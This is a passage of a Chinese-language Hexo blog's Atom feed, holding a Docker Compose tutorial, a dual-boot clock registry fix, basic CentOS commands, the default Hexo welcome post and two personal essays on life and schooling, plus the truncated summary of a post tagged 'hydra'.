    <summary type="html">&lt;h2 id=&quot;安装&quot;&gt;&lt;a href=&quot;#安装&quot; class=&quot;headerlink&quot; title=&quot;安装&quot;&gt;&lt;/a&gt;安装&lt;/h2&gt;&lt;p&gt;centos安装教程：&lt;a href=&quot;https://www.cnblogs.com/ellisonzhang/p/13440614.ht</summary>
      
    
    
    
    <category term="security" scheme="http://example.com/categories/security/"/>
    
    
    <category term="hydra" scheme="http://example.com/tags/hydra/"/>
    
  </entry>
  
  <entry>
    <title>docker-compose</title>
    <link href="http://example.com/2021/07/18/docker-compose/"/>
    <id>http://example.com/2021/07/18/docker-compose/</id>
    <published>2021-07-18T03:16:56.000Z</published>
    <updated>2021-07-19T15:54:55.921Z</updated>
    
    <content type="html"><![CDATA[<h2 id="overview"><a href="#overview" class="headerlink" title="overview"></a>overview</h2><p>Compose is a tool for defining and running multi-container Docker applications. </p><p>With Compose, you use a YAML file to configure your application’s services. Then, with a single command, you create and start all the services from your configuration. </p><p>Using Compose is basically a three-step process:</p><ol><li>Define your app’s environment with a <code>Dockerfile</code> so it can be reproduced anywhere.</li><li>Define the services that make up your app in <code>docker-compose.yml</code> so they can be run together in an isolated environment.</li><li>Run <code>docker compose up</code> </li></ol><h2 id="Get-started-with-Docker-Compose"><a href="#Get-started-with-Docker-Compose" class="headerlink" title="Get started with Docker Compose"></a>Get started with Docker Compose</h2><p>On this page you build a simple Python web application running on Docker Compose. </p><p>The application uses the Flask framework and maintains a hit counter in Redis. </p><p>While the sample uses Python, the concepts demonstrated here should be understandable even if you’re not familiar with it.</p><h3 id="Prerequisites"><a href="#Prerequisites" class="headerlink" title="Prerequisites"></a>Prerequisites</h3><p>Make sure you have already installed both <a href="https://docs.docker.com/get-docker/">Docker Engine</a> and <a href="https://docs.docker.com/compose/install/">Docker Compose</a>. You don’t need to install Python or Redis, as both are provided by Docker images.</p><h3 id="Step-1-Setup"><a href="#Step-1-Setup" class="headerlink" title="Step 1: Setup"></a>Step 1: Setup</h3><p>1、Create a directory for the project:</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> mkdir composetest</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> <span class="built_in">cd</span> composetest</span></span><br></pre></td></tr></table></figure><p>2、Create a file called <code>app.py</code> in your project directory and paste this in:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> redis</span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line">cache = redis.Redis(host=<span class="string">&#x27;redis&#x27;</span>, port=<span class="number">6379</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_hit_count</span>():</span></span><br><span class="line">    retries = <span class="number">5</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            <span class="keyword">return</span> cache.incr(<span class="string">&#x27;hits&#x27;</span>)</span><br><span class="line">        <span class="keyword">except</span> redis.exceptions.ConnectionError <span class="keyword">as</span> exc:</span><br><span class="line">            <span class="keyword">if</span> retries == <span class="number">0</span>:</span><br><span class="line">                <span class="keyword">raise</span> exc</span><br><span class="line">            retries -= <span class="number">1</span></span><br><span class="line">            time.sleep(<span class="number">0.5</span>)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span></span>)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">hello</span>():</span></span><br><span class="line">    count = get_hit_count()</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;Hello World! I have been seen &#123;&#125; times.\n&#x27;</span>.<span class="built_in">format</span>(count)</span><br></pre></td></tr></table></figure><p>In this example, <code>redis</code> is the hostname of the redis container on the application’s network. We use the default port for Redis, <code>6379</code>.</p><p>3、Create another file called <code>requirements.txt</code> in your project directory and paste this in:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">flask</span><br><span class="line">redis</span><br></pre></td></tr></table></figure><h3 id="Step-2-Create-a-Dockerfile"><a href="#Step-2-Create-a-Dockerfile" class="headerlink" title="Step 2: Create a Dockerfile"></a>Step 2: Create a Dockerfile</h3><p>In this step, you write a Dockerfile that builds a Docker image. The image contains all the dependencies the Python application requires, including Python itself.</p><p>In your project directory, create a file named <code>Dockerfile</code> and paste the following:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"># syntax=docker/dockerfile:1</span><br><span class="line">FROM python:3.7-alpine</span><br><span class="line">WORKDIR /code</span><br><span class="line">ENV FLASK_APP=app.py</span><br><span class="line">ENV FLASK_RUN_HOST=0.0.0.0</span><br><span class="line">RUN apk add --no-cache gcc musl-dev linux-headers</span><br><span class="line">COPY requirements.txt requirements.txt</span><br><span class="line">RUN pip install -r requirements.txt</span><br><span class="line">EXPOSE 5000</span><br><span class="line">COPY . .</span><br><span class="line">CMD [&quot;flask&quot;, &quot;run&quot;]</span><br></pre></td></tr></table></figure><p>This tells Docker to:</p><ul><li>Build an image starting with the Python 3.7 image.</li><li>Set the working directory to <code>/code</code>.</li><li>Set environment variables used by the <code>flask</code> command.</li><li>Install gcc and other dependencies</li><li>Copy <code>requirements.txt</code> and install the Python dependencies.</li><li>Add metadata to the image to describe that the container is listening on port 5000</li><li>Copy the current directory <code>.</code> in the project to the workdir <code>.</code> in the image.</li><li>Set the default command for the container to <code>flask run</code>.</li></ul><p>For more information on how to write Dockerfiles, see the <a href="https://docs.docker.com/develop/">Docker user guide</a> and the <a href="https://docs.docker.com/engine/reference/builder/">Dockerfile reference</a>.</p><h3 id="Step-3-Define-services-in-a-Compose-file"><a href="#Step-3-Define-services-in-a-Compose-file" class="headerlink" title="Step 3: Define services in a Compose file"></a>Step 3: Define services in a Compose file</h3><p>Create a file called <code>docker-compose.yml</code> in your project directory and paste the following:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">version: &quot;3.9&quot;</span><br><span class="line">services:</span><br><span class="line">  web:</span><br><span class="line">    build: .</span><br><span class="line">    ports:</span><br><span class="line">      - &quot;5000:5000&quot;</span><br><span class="line">  redis:</span><br><span class="line">    image: &quot;redis:alpine&quot;</span><br></pre></td></tr></table></figure><p>This Compose file defines two services: <code>web</code> and <code>redis</code>.</p><h4 id="Web-service"><a href="#Web-service" class="headerlink" title="Web service"></a>Web service</h4><p>The <code>web</code> service uses an image that’s built from the <code>Dockerfile</code> in the current directory. It then binds the container and the host machine to the exposed port, <code>5000</code>. This example service uses the default port for the Flask web server, <code>5000</code>.</p><h4 id="Redis-service"><a href="#Redis-service" class="headerlink" title="Redis service"></a>Redis service</h4><p>The <code>redis</code> service uses a public <a href="https://registry.hub.docker.com/_/redis/">Redis</a> image pulled from the Docker Hub registry.</p><h3 id="Step-4-Build-and-run-your-app-with-Compose"><a href="#Step-4-Build-and-run-your-app-with-Compose" class="headerlink" title="Step 4: Build and run your app with Compose"></a>Step 4: Build and run your app with Compose</h3><ol><li>From your project directory, start up your application by running <code>docker-compose up</code>.</li><li>Enter <a href="http://localhost:5000/">http://localhost:5000/</a> in a browser to see the application running.</li></ol><h3 id="Step-5-Edit-the-Compose-file-to-add-a-bind-mount"><a href="#Step-5-Edit-the-Compose-file-to-add-a-bind-mount" class="headerlink" title="Step 5: Edit the Compose file to add a bind mount"></a>Step 5: Edit the Compose file to add a bind mount</h3><p>Edit <code>docker-compose.yml</code> in your project directory to add a <a href="https://docs.docker.com/storage/bind-mounts/">bind mount</a> for the <code>web</code> service:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">version: &quot;3.9&quot;</span><br><span class="line">services:</span><br><span class="line">  web:</span><br><span class="line">    build: .</span><br><span class="line">    ports:</span><br><span class="line">      - &quot;5000:5000&quot;</span><br><span class="line">    volumes:</span><br><span class="line">      - .:/code</span><br><span class="line">    environment:</span><br><span class="line">      FLASK_ENV: development</span><br><span class="line">  redis:</span><br><span class="line">    image: &quot;redis:alpine&quot;</span><br></pre></td></tr></table></figure><p>The new <code>volumes</code> key mounts the project directory (current directory) on the host to <code>/code</code> inside the container, allowing you to modify the code on the fly, without having to rebuild the image. The <code>environment</code> key sets the <code>FLASK_ENV</code> environment variable, which tells <code>flask run</code> to run in development mode and reload the code on change. This mode should only be used in development.</p><h3 id="Step-6-Re-build-and-run-the-app-with-Compose"><a href="#Step-6-Re-build-and-run-the-app-with-Compose" class="headerlink" title="Step 6: Re-build and run the app with Compose"></a>Step 6: Re-build and run the app with Compose</h3><p>From your project directory, type <code>docker-compose up</code> to build the app with the updated Compose file, and run it.</p><h3 id="Step-7-Update-the-application"><a href="#Step-7-Update-the-application" class="headerlink" title="Step 7: Update the application"></a>Step 7: Update the application</h3><p>Because the application code is now mounted into the container using a volume, you can make changes to its code and see the changes instantly, without having to rebuild the image.</p><p>Change the greeting in <code>app.py</code> and save it. For example, change the <code>Hello World!</code> message to <code>Hello from Docker!</code>:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">return &#x27;Hello from Docker! I have been seen &#123;&#125; times.\n&#x27;.format(count)</span><br></pre></td></tr></table></figure><p>Refresh the app in your browser. The greeting should be updated, and the counter should still be incrementing.</p><h3 id="Step-8-Experiment-with-some-other-commands"><a href="#Step-8-Experiment-with-some-other-commands" class="headerlink" title="Step 8: Experiment with some other commands"></a>Step 8: Experiment with some other commands</h3><p>If you want to run your services in the background, you can pass the <code>-d</code> flag (for “detached” mode) to <code>docker-compose up</code> and use <code>docker-compose ps</code> to see what is currently running:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">$ docker-compose up -d</span><br><span class="line"></span><br><span class="line">Starting composetest_redis_1...</span><br><span class="line">Starting composetest_web_1...</span><br><span class="line"></span><br><span class="line">$ docker-compose ps</span><br><span class="line"></span><br><span class="line">       Name                      Command               State           Ports         </span><br><span class="line">-------------------------------------------------------------------------------------</span><br><span class="line">composetest_redis_1   docker-entrypoint.sh redis ...   Up      6379/tcp              </span><br><span class="line">composetest_web_1     flask run                        Up      0.0.0.0:5000-&gt;5000/tcp</span><br></pre></td></tr></table></figure><p>The <code>docker-compose run</code> command allows you to run one-off commands for your services. For example, to see what environment variables are available to the <code>web</code> service:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ docker-compose run web env</span><br></pre></td></tr></table></figure><p>See <code>docker-compose --help</code> to see other available commands. You can also install <a href="https://docs.docker.com/compose/completion/">command completion</a> for the bash and zsh shell, which also shows you available commands.</p><p>If you started Compose with <code>docker-compose up -d</code>, stop your services once you’ve finished with them:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ docker-compose stop</span><br></pre></td></tr></table></figure><p>You can bring everything down, removing the containers entirely, with the <code>down</code> command. Pass <code>--volumes</code> to also remove the data volume used by the Redis container:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ docker-compose down --volumes</span><br></pre></td></tr></table></figure><p>At this point, you have seen the basics of how Compose works.</p><p>原文链接：</p><ul><li><a href="https://docs.docker.com/compose/gettingstarted/">https://docs.docker.com/compose/gettingstarted/</a></li></ul>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;overview&quot;&gt;&lt;a href=&quot;#overview&quot; class=&quot;headerlink&quot; title=&quot;overview&quot;&gt;&lt;/a&gt;overview&lt;/h2&gt;&lt;p&gt;Compose is a tool for defining and running mul</summary>
      
    
    
    
    <category term="docker" scheme="http://example.com/categories/docker/"/>
    
    
    <category term="docker-compose" scheme="http://example.com/tags/docker-compose/"/>
    
  </entry>
  
  <entry>
    <title>黑苹果+Win10双系统时间晚8小时修复方法</title>
    <link href="http://example.com/2021/07/02/%E9%BB%91%E8%8B%B9%E6%9E%9C-Win10%E5%8F%8C%E7%B3%BB%E7%BB%9F%E6%97%B6%E9%97%B4%E6%99%9A8%E5%B0%8F%E6%97%B6%E4%BF%AE%E5%A4%8D%E6%96%B9%E6%B3%95/"/>
    <id>http://example.com/2021/07/02/%E9%BB%91%E8%8B%B9%E6%9E%9C-Win10%E5%8F%8C%E7%B3%BB%E7%BB%9F%E6%97%B6%E9%97%B4%E6%99%9A8%E5%B0%8F%E6%97%B6%E4%BF%AE%E5%A4%8D%E6%96%B9%E6%B3%95/</id>
    <published>2021-07-02T01:35:51.000Z</published>
    <updated>2021-07-15T14:37:02.487Z</updated>
    
    <content type="html"><![CDATA[<h3 id="修改Windows注册表"><a href="#修改Windows注册表" class="headerlink" title="修改Windows注册表"></a>修改Windows注册表</h3><ol><li>使用快捷键“Win”+ 【R】组合快捷键。在打开后面键入命令：<code>regedit</code></li><li>修改 win10 注册表，点击打开</li></ol><blockquote><p>HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\TimeZoneInformation\</p></blockquote><p>新建一项 DWORD 值 名为 “ RealTimeIsUniversal ”双击改成值为 1</p><h3 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h3><ul><li><a href="https://v2ex.com/t/330394">https://v2ex.com/t/330394</a></li></ul>]]></content>
    
    
      
      
    <summary type="html">&lt;h3 id=&quot;修改Windows注册表&quot;&gt;&lt;a href=&quot;#修改Windows注册表&quot; class=&quot;headerlink&quot; title=&quot;修改Windows注册表&quot;&gt;&lt;/a&gt;修改Windows注册表&lt;/h3&gt;&lt;ol&gt;
&lt;li&gt;使用快捷键“Win”+ 【R】组合快捷键。在打开</summary>
      
    
    
    
    
    <category term="搞机" scheme="http://example.com/tags/%E6%90%9E%E6%9C%BA/"/>
    
  </entry>
  
  <entry>
    <title>Hello World</title>
    <link href="http://example.com/2021/06/30/hello-world/"/>
    <id>http://example.com/2021/06/30/hello-world/</id>
    <published>2021-06-30T02:41:23.000Z</published>
    <updated>2021-06-30T02:41:23.000Z</updated>
    
    <content type="html"><![CDATA[<p>Welcome to <a href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p><h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo new <span class="string">&quot;My New Post&quot;</span></span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/writing.html">Writing</a></p><h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/server.html">Server</a></p><h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/generating.html">Generating</a></p><h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;Welcome to &lt;a href=&quot;https://hexo.io/&quot;&gt;Hexo&lt;/a&gt;! This is your very first post. Check &lt;a href=&quot;https://hexo.io/docs/&quot;&gt;documentation&lt;/a&gt; for</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>Centos常用命令</title>
    <link href="http://example.com/2021/06/30/centos%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4/"/>
    <id>http://example.com/2021/06/30/centos%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4/</id>
    <published>2021-06-30T02:37:28.000Z</published>
    <updated>2021-07-03T10:38:07.273Z</updated>
    
    <content type="html"><![CDATA[<h1 id="查询"><a href="#查询" class="headerlink" title="查询"></a>查询</h1><h2 id="centos版本："><a href="#centos版本：" class="headerlink" title="centos版本："></a>centos版本：</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat /etc/redhat-release</span><br></pre></td></tr></table></figure><h2 id="端口监听服务："><a href="#端口监听服务：" class="headerlink" title="端口监听服务："></a>端口监听服务：</h2><p>查询端口监听情况：<code>netstat -lnautp | grep LISTEN</code></p><h1 id="修改"><a href="#修改" class="headerlink" title="修改"></a>修改</h1><h2 id="目录所有者"><a href="#目录所有者" class="headerlink" title="目录所有者"></a>目录所有者</h2><p>1.更改目录所有者命令:<br> <code>chown -R 用户名称 目录名称  </code> </p><p>2.更改目录权限命令:<br> <code>chmod -R 755 目录名称</code></p><p>to be continue …</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;查询&quot;&gt;&lt;a href=&quot;#查询&quot; class=&quot;headerlink&quot; title=&quot;查询&quot;&gt;&lt;/a&gt;查询&lt;/h1&gt;&lt;h2 id=&quot;centos版本：&quot;&gt;&lt;a href=&quot;#centos版本：&quot; class=&quot;headerlink&quot; title=&quot;centos版</summary>
      
    
    
    
    <category term="linux" scheme="http://example.com/categories/linux/"/>
    
    
    <category term="centos" scheme="http://example.com/tags/centos/"/>
    
  </entry>
  
  <entry>
    <title>更好的别人</title>
    <link href="http://example.com/2021/06/28/%E6%9B%B4%E5%A5%BD%E7%9A%84%E5%88%AB%E4%BA%BA/"/>
    <id>http://example.com/2021/06/28/%E6%9B%B4%E5%A5%BD%E7%9A%84%E5%88%AB%E4%BA%BA/</id>
    <published>2021-06-28T15:27:28.000Z</published>
    <updated>2021-06-28T15:27:51.026Z</updated>
    
    <content type="html"><![CDATA[<h2 id="引言"><a href="#引言" class="headerlink" title="引言"></a><strong>引言</strong></h2><p>别人都在等待更好的别人，而我在等着更好的你。</p><h2 id="循环"><a href="#循环" class="headerlink" title="循环"></a><strong>循环</strong></h2><p>转眼已经毕业数年，感觉陷入日复一日の循环中而丧失了某些头脑中机能。有时候会想，是否我们的生活本该是这个样子，是否到我们这个年纪本该就是这个样子？生活什么时候变成了什么都想要，什么都差点够到的样子 —— 感觉就像被胡萝卜牵着走的驴，不知道自己的目的地是何方。</p><h2 id="别人"><a href="#别人" class="headerlink" title="别人"></a><strong>别人</strong></h2><blockquote><p>大概两年时间中，认识了100多个不同院系的北大同学，觉得他们上学时比我在大学时目标明确的很多，他们非常清楚的知道自己要什么，以及为了达到这个目标要走什么样的路径，需要哪些资源等等。这些东西感觉他们每个人都很清楚。而我们当时上学的时候，大家每天就是上课自习打游戏之类的，迷迷糊糊毕业之后更多的是时代大势推动着在前进。至少我自己在遇到老婆之前就从来没有过什么职业规划之类的，靠技术吃饭的，大概就是看看同学去哪，就跟着去哪先混着，混出点名堂了再跳槽这种。</p></blockquote><p>这是知乎上一个看着很有感触的回答。目标明确 + 持续不懈的努力 — 这就是成功人士和普通人的差别吧，这也是看到众多鸡汤文中浅析不过的道理了。难道我们就是”知道了很多为人处世的道理，依旧过不好这一生”的例子？</p><h2 id="存在"><a href="#存在" class="headerlink" title="存在"></a><strong>存在</strong></h2><p>或许，有些事情总是我想做的吧？不是可劲玩喜欢的游戏，不是更好的车、更大的房子，甚至赚更多的钱 。也许是慢慢察觉到要慢慢变成一个无聊的中年人，我开始想到王小波的“在我看来，春天里一棵小草生长，它没有什么目的。风起时一匹公马发情，它也没有什么目的。草长马发情，绝非表演给什么人看的，这就是存在本身”。那么，我们存在的本身是什么呢？</p><h2 id="回忆"><a href="#回忆" class="headerlink" title="回忆"></a><strong>回忆</strong></h2><p>记得《简单法则》里有句话，大概意思是等到年老时，除了回忆我们一无所需，除了回忆我们一无所有。王小波说“以后我要真诚地做一切事情，我要像笛卡尔一样思辨，像堂吉诃德一样攻击风车。无论写诗还是做爱，都要以极大的真诚完成。眼前就是罗得岛，我就在这里跳跃——我这么做什么都不为，这就是存在本身。”</p><p>也许只要真诚地去做一切事情，便很好了吧~</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;引言&quot;&gt;&lt;a href=&quot;#引言&quot; class=&quot;headerlink&quot; title=&quot;引言&quot;&gt;&lt;/a&gt;&lt;strong&gt;引言&lt;/strong&gt;&lt;/h2&gt;&lt;p&gt;别人都在等待更好的别人，而我在等着更好的你。&lt;/p&gt;
&lt;h2 id=&quot;循环&quot;&gt;&lt;a href=&quot;#循环&quot; </summary>
      
    
    
    
    
    <category term="随の想" scheme="http://example.com/tags/%E9%9A%8F%E3%81%AE%E6%83%B3/"/>
    
  </entry>
  
  <entry>
    <title>恰同学少年</title>
    <link href="http://example.com/2021/06/28/%E6%81%B0%E5%90%8C%E5%AD%A6%E5%B0%91%E5%B9%B4/"/>
    <id>http://example.com/2021/06/28/%E6%81%B0%E5%90%8C%E5%AD%A6%E5%B0%91%E5%B9%B4/</id>
    <published>2021-06-28T15:24:20.000Z</published>
    <updated>2021-06-28T15:26:38.581Z</updated>
    
    <content type="html"><![CDATA[<h2 id="引言"><a href="#引言" class="headerlink" title="引言"></a><strong>引言</strong></h2><p>如果一切都可以重来，你会选择怎样的开始？</p><h2 id="遥远的Ta"><a href="#遥远的Ta" class="headerlink" title="遥远的Ta"></a><strong>遥远的Ta</strong></h2><p>如果你有兴趣继续看下去，也许也会有耐心听我介绍自己的过去：一个遥远的过去，犹如梦境中的清晨，晶莹剔透的雨滴，顺着老屋的瓦，缓缓坠入沟渠。那是一个仿佛已经很久远的年代。那时候的村庄，没有手机，没有互联网，也没有“非常6+1”的幸运观众。有的只是青山，有的只是小溪，还有傍晚夕阳西下时升起的袅袅炊烟。而我，就是在这个宛如与世隔绝的村庄，度过了人生最初的十年。</p><h2 id="邂逅死亡"><a href="#邂逅死亡" class="headerlink" title="邂逅死亡"></a><strong>邂逅死亡</strong></h2><p>在记忆中某个已褪色的冬天，暴雨过后河水暴涨，叫嚣着漫过河堤，淹没原野。当时的我穿着厚重的大棉衣，流着鼻涕，一个人在河堤上慢慢地走着。已经记不清当时为什么要沿着河堤走(回家)，只记得脚下的河堤突然垮了，一脚踏空的我掉入洪水中。而周围，一个人都没有。</p><p>河水咆哮着灌入我的衣服里，发出类似于往玻璃瓶中倒水的声音。我下意识地往岸边游去，伸出手想要抓住什么。然而，洪水却以更快的速度把我往下游推。当时年幼的我头脑一片空白，意识到“我可能会死”。</p><p>死亡对一个孩子来说，意味着什么？我不知道，只是感到一股难以抵抗的恐惧感，唯一能做的就是臣服于本能 —— 我猛地把头扎入冰冷的水中，使出了全身的力气，以潜泳的方式拼命地往岸边游去终于，我抓住了什么东西，顺势爬上了岸边，像一条落水狗一样，趴在岸边喘着粗气、瑟瑟发抖。</p><h2 id="平凡之路"><a href="#平凡之路" class="headerlink" title="平凡之路"></a><strong>平凡之路</strong></h2><p>也许是因为那段宛如梦境的经历，让我的整个求学生涯都伴随着某种形式上的孤独感。虽然已经记不清楚，自己怎么一个人走过来的。整个求学期间，“不合群”给别人的最大感觉。与其说“不合群”，不如说“气质不对”（主要看气质）—— 大概给人一种“看不出有什么太奇怪，但就是和我们不一样”的感觉吧。于是乎，我一个人去看书、一个人去长跑、一个人去做那些可以一个人能做好的事情。在读书期间，孤独给我的不止是夜间路灯下那个形单影只的背影，还有某种程度上的钝感。后来，依赖着类似于堂吉诃德式的勇气，我走完了整个小初高中，走向了大学。</p><p>而我的大学，并没有让我达到某个方面某种质的飞跃，也没有什么专业性积累，这也算是某种程度上的虚度光阴吧。在大学期间，开始逐渐接触到这么一种说法，即“为编程而生”。</p><blockquote><p>你不仅得有天赋，还得具备激情，才能成为一名优秀的程序员。 … 好像那些写代码的人是早就决定干这一行似的，“当他们还是孩子的时候，他们就打算将来去写代码”。如果你缺少这两个因素之一，那么你要么是一个骗子，要么不会走得太远。</p></blockquote><p>我从来都不觉得自己有过什么天赋，更不会有那种“为编程而生”的感觉。在专业课学得不好的时候，也会怀疑自己是不是选错专业了。然而，地球在转动，生活也要继续，我唯一能做的，就是学好专业知识，以期毕业后能混口饭吃。既然已经选择，又无讨价的余地，唯有硬着头皮上了。既便如此，“闭门造车”坏习惯很快成为我的拦路虎，整个大学都是重复“上课睡觉，考前预习”的模式。在挂了几科后，甚至一度怀疑自己能否顺利毕业，也算是“学渣”的烦恼吧。直到后来接触到鱼C，才觉得稍微有点编程姿态，也渐渐有点程序员的样子。</p><p>言及方法，也许是因为社会节奏越来越快，社会上弥漫着一股类似于“方法不对，努力白费”、“如果方向错了，停止就是进步”的言论。浮躁让我们把注重点放在“方法”、“秘诀”之类的捷径上，而忽略了努力本身。试想，从小喝的鸡汤，对我们的进步是否真的有所帮助？</p><p>今年七月初，我只身一人飞到深圳，这个从未涉足的城市。从没有想过要“出任CEO，迎娶白富美，走向人生巅峰”，只想着怎么自力更生，养活自己。快3个月过去了，我很幸运地找到了一份工作，和无数慕名而来的年轻人一样，挥洒着自己的汗水，为了一个可能更美好的明天奋斗着。</p><h2 id="后记"><a href="#后记" class="headerlink" title="后记"></a><strong>后记</strong></h2><p>回到最开始的问题“如果一切都可以重来，你会选择怎样的开始？现在跳到另一个问题“如果一切都只能继续，你会选择怎样的继续？”</p><blockquote><p>众里寻她，如果找到的只是无奈，你是否继续等待？蓦然回首，如果剩下的只有苍白，你是否能够释怀？</p></blockquote><p>执着于自己的执着，落寞于自己的错过，带着伤痛和坚毅，每个人都能走得更远。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;引言&quot;&gt;&lt;a href=&quot;#引言&quot; class=&quot;headerlink&quot; title=&quot;引言&quot;&gt;&lt;/a&gt;&lt;strong&gt;引言&lt;/strong&gt;&lt;/h2&gt;&lt;p&gt;如果一切都可以重来，你会选择怎样的开始？&lt;/p&gt;
&lt;h2 id=&quot;遥远的Ta&quot;&gt;&lt;a href=&quot;#遥远的</summary>
      
    
    
    
    
    <category term="随の想" scheme="http://example.com/tags/%E9%9A%8F%E3%81%AE%E6%83%B3/"/>
    
  </entry>
  
</feed>
